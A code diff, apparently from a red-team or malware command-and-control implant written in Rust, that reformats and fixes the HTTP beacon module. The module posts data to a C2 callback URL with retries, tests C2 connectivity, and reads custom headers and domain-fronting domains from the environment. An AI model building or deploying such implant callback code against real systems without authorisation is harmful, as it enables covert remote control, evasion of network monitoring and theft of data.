@@ -41,10 +41,7 @@ impl C2Profile for HTTPProfile {
     /// Required implementation for sending data to the C2
     fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
         // Send an HTTP post request with the data
-        http_post(
-            &self.get_callback_url(),
-            data,
-        )
+        http_post(&self.get_callback_url(), data)
     }
 
     /// Gets the AES key from the HTTPProfile
@@ -66,7 +63,7 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
     let mut req = minreq::post(url)
         .with_header("User-Agent", &profilevars::useragent())
         .with_body(body)
-        .with_timeout(Duration::from_secs(30)); // 30 second timeout
+        .with_timeout(30); // 30 second timeout (u64, not Duration)
 
     // Add any additional headers
     if let Some(headers) = profilevars::headers() {
@@ -78,9 +75,9 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
     // Send the post request with retry logic
     let mut last_error = None;
     let max_retries = 3;
-    
+
     for attempt in 1..=max_retries {
-        match req.send() {
+        match req.clone().send() {
             Ok(res) => {
                 // Check the status code
                 if res.status_code == 200 {
@@ -94,7 +91,7 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
             }
             Err(e) => {
                 last_error = Some(format!("HTTP request failed: {}", e));
-                
+
                 // Add exponential backoff for retries
                 if attempt < max_retries {
                     let delay = Duration::from_millis(500 * (1 << (attempt - 1)));
@@ -105,7 +102,9 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
     }
 
     // If we get here, all retries failed
-    Err(last_error.unwrap_or_else(|| "Unknown HTTP error".to_string()).into())
+    Err(last_error
+        .unwrap_or_else(|| "Unknown HTTP error".to_string())
+        .into())
 }
 
 /// Test HTTP connectivity to the C2 server
@@ -113,7 +112,7 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
 pub fn test_http_connection(url: &str) -> Result<bool, Box<dyn Error>> {
     let test_req = minreq::get(url)
         .with_header("User-Agent", &profilevars::useragent())
-        .with_timeout(Duration::from_secs(10));
+        .with_timeout(10); // 10 second timeout (u64, not Duration)
 
     match test_req.send() {
         Ok(res) => Ok(res.status_code < 500), // Accept any non-server-error response
@@ -170,7 +169,9 @@ pub mod profilevars {
     pub fn headers() -> Option<HashMap<String, String>> {
         match std::env::var("headers") {
             Ok(headers_str) => {
-                if let Ok(mut headers) = serde_json::from_str::<HashMap<String, String>>(&headers_str) {
+                if let Ok(mut headers) =
+                    serde_json::from_str::<HashMap<String, String>>(&headers_str)
+                {
                     headers.remove("User-Agent");
                     if !headers.is_empty() {
                         Some(headers)
@@ -296,9 +297,7 @@ pub mod profilevars {
     /// Get list of domain fronting domains
     pub fn domain_front_domains() -> Option<Vec<String>> {
         match std::env::var("domain_front_domains") {
-            Ok(domains_str) => {
-                serde_json::from_str::<Vec<String>>(&domains_str).ok()
-            }
+            Ok(domains_str) => serde_json::from_str::<Vec<String>>(&domains_str).ok(),
             Err(_) => None,
         }
     }
